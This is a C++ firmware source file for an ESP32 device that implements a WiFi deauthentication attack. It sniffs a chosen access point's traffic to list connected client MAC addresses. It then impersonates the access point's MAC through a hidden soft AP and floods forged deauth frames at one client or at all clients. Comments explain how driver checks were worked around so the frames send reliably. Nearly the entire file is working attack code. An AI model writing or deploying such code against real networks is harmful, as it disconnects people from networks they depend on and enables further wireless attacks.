#include "WifiDeauth.h"

#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/semphr.h>

#include "RadioManager.h"
#include "../hw/Leds.h"

namespace radio {
namespace wifi_deauth {

namespace {

constexpr int MAX_CLIENTS = 24;

uint8_t      g_bssid[6]   = {};
uint8_t      g_channel    = 1;
Client       g_clients[MAX_CLIENTS];
int          g_clientCount = 0;
SemaphoreHandle_t g_mu    = nullptr;

bool         g_listening  = false;
bool         g_attacking  = false;
uint32_t     g_totalSeen  = 0;
uint32_t     g_matched    = 0;
uint32_t     g_txErr      = 0;
esp_err_t    g_lastErr    = ESP_OK;
uint8_t      g_target[6]  = {};
bool         g_broadcast  = true;
TaskHandle_t g_task       = nullptr;
bool         g_stop       = false;
uint32_t     g_tx         = 0;

bool macEq(const uint8_t* a, const uint8_t* b) {
    for (int i = 0; i < 6; ++i) if (a[i] != b[i]) return false;
    return true;
}
bool isZero(const uint8_t* m) {
    return !(m[0]|m[1]|m[2]|m[3]|m[4]|m[5]);
}

void addOrBump(const uint8_t* mac, int8_t rssi) {
    if (isZero(mac) || macEq(mac, g_bssid)) return;
    if (mac[0] & 0x01) return; // skip multicast/broadcast addresses

    if (xSemaphoreTake(g_mu, 0) != pdTRUE) return;
    for (int i = 0; i < g_clientCount; ++i) {
        if (macEq(g_clients[i].mac, mac)) {
            g_clients[i].rssi        = rssi;
            g_clients[i].lastSeenMs  = millis();
            g_clients[i].packetCount++;
            xSemaphoreGive(g_mu);
            return;
        }
    }
    if (g_clientCount < MAX_CLIENTS) {
        auto& c = g_clients[g_clientCount++];
        memcpy(c.mac, mac, 6);
        c.rssi = rssi;
        c.lastSeenMs = millis();
        c.packetCount = 1;
    }
    xSemaphoreGive(g_mu);
}

// Parse any 802.11 data frame seen while the BSSID matches our target.
// We harvest the client MAC from the fromDS/toDS address fields.
void IRAM_ATTR promCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
    auto* pkt = (wifi_promiscuous_pkt_t*)buf;
    if (pkt->rx_ctrl.sig_len < 24) return;

    g_totalSeen++;  // count every captured mgmt/data frame

    const uint8_t* p  = pkt->payload;
    const uint8_t* a1 = p + 4;   // receiver / dest
    const uint8_t* a2 = p + 10;  // transmitter / src
    const uint8_t* a3 = p + 16;  // BSSID for most frame types

    // Match BSSID in any of the three address fields — catches data frames
    // in both directions (AP→client has BSSID in a2/a3, client→AP in a1/a3).
    const uint8_t* bssid = nullptr;
    if      (macEq(a3, g_bssid)) bssid = a3;
    else if (macEq(a2, g_bssid)) bssid = a2;
    else if (macEq(a1, g_bssid)) bssid = a1;
    if (!bssid) return;

    g_matched++;
    int8_t rssi = pkt->rx_ctrl.rssi;
    if (!macEq(a1, bssid)) addOrBump(a1, rssi);
    if (!macEq(a2, bssid)) addOrBump(a2, rssi);
    if (!macEq(a3, bssid)) addOrBump(a3, rssi);
}

uint8_t DEAUTH_TEMPLATE[26] = {
    0xC0, 0x00,                           // frame ctrl: deauth
    0x3A, 0x01,                           // duration
    0,0,0,0,0,0,                          // addr1 — dest (client or broadcast)
    0,0,0,0,0,0,                          // addr2 — src (= BSSID, looks like AP)
    0,0,0,0,0,0,                          // addr3 — BSSID
    0x00, 0x00,                           // seq
    0x07, 0x00,                           // reason: class-3 frame
};

void setEsp32Channel(uint8_t ch) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

void taskEntry(void*) {
    // Transition cleanly from promiscuous-listen into AP-mode TX.
    //
    // Key points discovered the hard way:
    //   - esp_wifi_80211_tx(WIFI_IF_AP, …) only succeeds if there's a
    //     *started* AP interface; WiFi.mode(WIFI_AP) isn't enough, we need
    //     an actual softAP() start (hidden, no clients).
    //   - Keep promiscuous=true — required for raw frames on most IDF
    //     versions.
    //   - Re-set the channel every loop: the WiFi driver's internal beacon
    //     task drifts it otherwise.
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    vTaskDelay(pdMS_TO_TICKS(50));

    // Impersonate target AP — set_mac only works while interface is stopped.
    esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP,
                                        const_cast<uint8_t*>(g_bssid));
    WiFi.mode(WIFI_AP);
    bool apOk = WiFi.softAP("esp32div-x", nullptr, g_channel, /*hidden=*/1,
                            /*max_connection=*/0);
    esp_wifi_set_promiscuous(true);
    setEsp32Channel(g_channel);
    vTaskDelay(pdMS_TO_TICKS(100));

    // Verify what the interface MAC actually ended up as.
    uint8_t actualMac[6] = {};
    esp_wifi_get_mac(WIFI_IF_AP, actualMac);
    Serial.printf("[deauth] set_mac=0x%x softAP=%d  actual=%02X:%02X:%02X:%02X:%02X:%02X  target=%02X:%02X:%02X:%02X:%02X:%02X\n",
        (unsigned)macErr, apOk,
        actualMac[0], actualMac[1], actualMac[2], actualMac[3], actualMac[4], actualMac[5],
        g_bssid[0], g_bssid[1], g_bssid[2], g_bssid[3], g_bssid[4], g_bssid[5]);

    memcpy(DEAUTH_TEMPLATE + 10, g_bssid, 6);
    memcpy(DEAUTH_TEMPLATE + 16, g_bssid, 6);
    if (g_broadcast) memset(DEAUTH_TEMPLATE + 4, 0xFF, 6);
    else             memcpy(DEAUTH_TEMPLATE + 4, g_target, 6);

    // Re-pin the channel once per second — covers rare driver drift
    // without racing every single send with a channel change (which was
    // the source of the residual 0x102 errors during the attack).
    uint32_t lastChanMs = 0;
    while (!g_stop) {
        uint32_t nowMs = millis();
        if (nowMs - lastChanMs > 1000) {
            setEsp32Channel(g_channel);
            lastChanMs = nowMs;
        }
        // en_sys_seq=true lets the driver fill sequence/addr2 as needed —
        // that sidesteps the strict addr2-matches-interface-MAC check that
        // was returning 0x102 (ESP_ERR_INVALID_ARG) on every tx.
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, DEAUTH_TEMPLATE,
                                          sizeof(DEAUTH_TEMPLATE), true);
        if (err == ESP_OK) {
            g_tx++;
            static uint32_t last = 0;
            uint32_t now = millis();
            if (now - last > 80) {
                leds::signal(leds::Channel::Wifi, leds::Event::Tx);
                last = now;
            }
        }
        else { g_txErr++; g_lastErr = err; }
        vTaskDelay(pdMS_TO_TICKS(2));
    }
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    g_task = nullptr;
    vTaskDelete(nullptr);
}

void startListenTask() {
    // WiFi.mode(STA) first forces the esp_wifi subsystem into a known-good
    // state (calls esp_wifi_init() internally with the right default
    // config). Calling esp_wifi_init(nullptr) ourselves would panic.
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(/*wifioff=*/false, /*eraseap=*/false);
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(&promCb);

    // Explicit filter for management + data — needed on some esp-idf
    // versions where the default filter drops data frames.
    wifi_promiscuous_filter_t filt{};
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
                     | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous(true);
    setEsp32Channel(g_channel);
}

} // namespace

bool startListen(const uint8_t bssid[6], uint8_t channel) {
    if (!radio::acquire(radio::Owner::Wifi)) return false;
    if (!g_mu) g_mu = xSemaphoreCreateMutex();

    memcpy(g_bssid, bssid, 6);
    g_channel = channel ? channel : 1;
    g_clientCount = 0;
    g_tx = 0;
    g_totalSeen = 0;
    g_matched = 0;

    startListenTask();
    g_listening = true;
    g_attacking = false;
    return true;
}

void stop() {
    if (g_attacking) {
        g_stop = true;
        for (int i = 0; i < 50 && g_task; ++i) vTaskDelay(pdMS_TO_TICKS(10));
    }
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    g_listening = false;
    g_attacking = false;
    radio::release(radio::Owner::Wifi);
}

bool listening() { return g_listening; }
int  clientCount() {
    int n = 0;
    if (g_mu && xSemaphoreTake(g_mu, pdMS_TO_TICKS(20)) == pdTRUE) {
        n = g_clientCount;
        xSemaphoreGive(g_mu);
    }
    return n;
}
bool clientAt(int i, Client& out) {
    if (!g_mu) return false;
    if (xSemaphoreTake(g_mu, pdMS_TO_TICKS(50)) != pdTRUE) return false;
    bool ok = (i >= 0 && i < g_clientCount);
    if (ok) out = g_clients[i];
    xSemaphoreGive(g_mu);
    return ok;
}
void clearClients() {
    if (!g_mu) return;
    xSemaphoreTake(g_mu, portMAX_DELAY);
    g_clientCount = 0;
    xSemaphoreGive(g_mu);
}

bool attack(const uint8_t* targetClient) {
    if (!g_listening) return false;
    g_broadcast = (targetClient == nullptr);
    if (!g_broadcast) memcpy(g_target, targetClient, 6);

    // Swap from promiscuous listen into AP-mode TX.
    esp_wifi_set_promiscuous(false);
    g_listening = false;
    g_attacking = true;
    g_stop = false;
    xTaskCreatePinnedToCore(taskEntry, "deauth_tx", 4096, nullptr,
                            /*prio=*/1, &g_task, /*coreId=*/1);
    return true;
}

bool attacking()                      { return g_attacking; }
uint32_t txCount()                    { return g_tx; }
uint32_t totalFramesSeen()            { return g_totalSeen; }
uint32_t bssidMatchedFrames()         { return g_matched; }
uint32_t txErrorCount()               { return g_txErr; }
int      lastTxError()                { return (int)g_lastErr; }
bool currentTargetIsBroadcast()       { return g_broadcast; }
const uint8_t* currentTargetMac()     { return g_target; }
const uint8_t* currentBssid()         { return g_bssid; }
uint8_t  currentChannel()             { return g_channel; }

} // namespace wifi_deauth
} // namespace radio
